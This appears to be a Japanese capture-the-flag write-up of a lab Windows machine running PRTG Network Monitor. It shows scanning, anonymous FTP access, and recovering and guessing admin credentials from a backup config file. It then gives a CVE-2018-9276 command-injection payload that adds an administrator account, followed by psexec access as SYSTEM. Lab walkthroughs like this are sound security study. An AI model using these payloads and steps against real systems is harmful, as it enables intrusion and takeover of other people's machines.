# 1\. Port scan

$ip=10.10.10.152

sudo nmap -sC -sV -Pn $ip

-sC  対象のポートやサービスにスクリプトを実行するためのオプション。

-sV サービスバージョンの検出を目的としたスキャンを実行するためのオプション

-Pn ホスト検出をスキップする。pingを打たずにポートスキャンを実施するオプション。

![9a6c9fc718661608b431b40ea1163f29.png](../_resources/9a6c9fc718661608b431b40ea1163f29.png)

上記nmapの結果から

FTP

PRTG bandwidth monitor

SMB

の3種類のサービスが使われているのを確認した。

スキャンした結果、赤枠内のPRTGのバージョンが判明した為、googleから検索した結果、CVE-2018-9276の脆弱性が利用できるのを確認した。

参考URL:`https://github.com/A1vinSmith/CVE-2018-9276.git`

**CVE-2018-9276**

\*\*PRTGNetworkMoniterに関する脆弱性。\*\***この脆弱性はバージョン18.2.39以前のバージョンで見つかりました。****このバージョンのPRTG管理者ウェブコンソールに管理者権限を持つ攻撃者がアクセスした場合、センサーや****通知管理シナリオで不正なパラメータを送信することで、OSコマンドインジェクションの脆弱性が悪用される。**

# **2.SMBサービスをスキャン**

smbmap を使用してスキャンしたが認証に失敗した。

![5000f6b897f06af6b206fc6412c9f34f.png](../_resources/5000f6b897f06af6b206fc6412c9f34f.png)

# 3.FTPサーバにアクセス

![27420e565b7a11bf3adebdabf2a687bb.png](../_resources/27420e565b7a11bf3adebdabf2a687bb.png)

上記スキャン結果からFTPのパスワードが設定されていないことを確認した。

Anonymousログインに成功した。

![a83c13046125f3c7f554f7fc24f5b5cf.png](../_resources/a83c13046125f3c7f554f7fc24f5b5cf.png)

![cd73f9856e5fd04f90b9eb290dd502be.png](../_resources/cd73f9856e5fd04f90b9eb290dd502be.png)

user.txtをダウンロードした結果flagだった事を確認した。

# 4\. PRTGの情報を収集

nmapの実行結果から検知したサービスの情報と思われるものを確認した。

![51a94b536837f577c9c34c647e436b87.png](../_resources/51a94b536837f577c9c34c647e436b87.png)

## https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data

![b889331759fa829a866f148806fc1c00.png](../_resources/b889331759fa829a866f148806fc1c00.png)

デフォルトのインストール先がprogramdataに設定されている事をPaessler公式ページのSUPPORTから確認した。

ftpサーバへ接続は可能な為、同サーバ内からprogramdataディレクトリにアクセスできる事を確認した。

`ls`

![919951ffcf4eef7b04fb89d1803a9e2d.png](../_resources/919951ffcf4eef7b04fb89d1803a9e2d.png)

lsコマンドでは表示されなかった為 -laオプションで試行した。

`ls -la`

![c99b8462e07d6ccb05a0cff3f5175ada.png](../_resources/c99b8462e07d6ccb05a0cff3f5175ada.png)

hidden属性を含めたファイルを表示nmapで検出したサービス名と同じディレクトリを発見した。

`cd ProgramData`

`cd Paessler`

`cd ./"PRTG Network Monitor"`

![432de8bdd9419b0f6b695dcda9503c6d.png](../_resources/432de8bdd9419b0f6b695dcda9503c6d.png)

設定ファイルと思しき複数のファイルを確認したため解析の為にダウンロードした。

mget PRTG*

![017b45cb1e63d0c3dbbf46f60e620181.png](../_resources/017b45cb1e63d0c3dbbf46f60e620181.png)

ダウンロードした各種ファイルの解析を実施した。

`cat ./PRTG\ Configuration.dat | grep -B 3 -A 3 credential`

PRTG Configuration.datを解析したが有用な情報は確認できなかった。

![52c1cad51aae6289a2b820b9e2557adb.png](../_resources/52c1cad51aae6289a2b820b9e2557adb.png)

`cat ./PRTG\ Configuration.old | grep -B 3 -A 3 credential`

PRTG　Congiguration.oldを解析したが有用な情報は確認できなかった。

![2ea98b2f78f3df837a0c82a4e7fac2b4.png](../_resources/2ea98b2f78f3df837a0c82a4e7fac2b4.png)

バックアップを確認した結果

ファイル内のcredentialを表示した結果ユーザ名とパスワードを発見した。

PRTG　Configuration.old.bakを確認した所、ユーザIDとパスワードと思われる情報を確認した。

![8dfe2f19e004d2edd065cd7c9bc91caa.png](../_resources/8dfe2f19e004d2edd065cd7c9bc91caa.png)

記載してるユーザ情報でログインを試したが失敗した。

![d1c0f3386449415d710e8c67f61322f6.png](../_resources/d1c0f3386449415d710e8c67f61322f6.png)

パスワードは PrTg@dmin2018
ではなくPrTg@dmin2019と推測した。

![2f6b29b3a0646ad3a86c086fafabeb40.png](../_resources/2f6b29b3a0646ad3a86c086fafabeb40.png)

ログイン成功する。

# 5\. PRTGに侵入する

* * *

# ![53f6aee3f9146c7ff86701b83b2c3013.png](../_resources/53f6aee3f9146c7ff86701b83b2c3013.png)

[`https://github.com/A1vinSmith/CVE-2018-9276`](https://github.com/A1vinSmith/CVE-2018-9276%E3%82%92%E5%8F%82%E7%85%A7%E3%81%97%E3%81%A6)

[](https://github.com/A1vinSmith/CVE-2018-9276%E3%82%92%E5%8F%82%E7%85%A7%E3%81%97%E3%81%A6)を参考にして攻撃を実施した。

setup→

Account Settings →

Notifications→

11Add new Notification１１１111１1

![94a809760f8a5f772e7cb1af9c5decf9.png](../_resources/94a809760f8a5f772e7cb1af9c5decf9.png)

# 6.OSコマンドインジェクションを試行する。

program file Demo exe notification – outfile.ps1

parameterにtest.txt;net user pentestop P3nT3st! /add;net localgroup administrators pentestop /add

net user pentestop P3nT3st! /add

上記のコマンドを実行し、ローカルユーザアカウント「pentestop
pentestopユーザの P3nT3st!パスワードを追加した。

net localgroup administrators pentestop /add

作成したpentestopユーザを管理者グループのadministratorsに追加した。

![cbde80e4a400777524f6e963e918884f.png](../_resources/cbde80e4a400777524f6e963e918884f.png)

OSコマンドインジェクションを実施する。

作成したNotificationを実行できるのを確認した。

![bfba5762ac2138df97a5922022fc8968.png](../_resources/bfba5762ac2138df97a5922022fc8968.png)

net user pentestop P3nT3st! /add;コマンドとnet localgroup administrators pentestop /addコマンドが通知をONにしたタイミングで実行されて

pentestopユーザが追加されadministratorsグループに追加される

`smbmap -H 10.10.10.152 -u pentestop -p 'P3nT3st!'`

上記手順により作成したユーザアカウント「pentestop」がsmbmapの認証に使用できる可能性があることから

smbmapを実行しSMBサービスへのログインを試行して認証に成功した。

![1a5ec544d7e4ed8939519bb0567bac9e.png](../_resources/1a5ec544d7e4ed8939519bb0567bac9e.png)

SMB共有フォルダのパーミッションを確認した結果、C$ ADMIN$ のREAD,WRITEが許可されていることを確認した。

その結果psexec.pyが使用できると推測した。

psexec.pyは、IMPACKET Pythonモジュールに含まれる侵入テストスクリプトの一つである。このスクリプトは、Core Labsから提供されているIMPACKETツールセットの一部であり、侵入テストやセキュリティ評価のために使用される。

リモートログインできる条件は「管理者権限があること」とSMB共有フォルダ「ADMIN$」「C$」のパーミッションがREAD,WRITEであること。

今回は上記条件を満たしているのでリモートアクセス可能であると推測し、試行した。

`python3 psexec.py 'pentestop:P3nT3st!@10.10.10.152'`

![95ee0d18ab01d774214508f076c59022.png](../_resources/95ee0d18ab01d774214508f076c59022.png)

システム権限ユーザ「nt authority\\system」でログインしたことを確認した。

C:\\Users\\Administrator\\Desktopに移動してroot.txtを取得した。

![6a5c94e8da760a84627b33b47e9202c2.png](../_resources/6a5c94e8da760a84627b33b47e9202c2.png)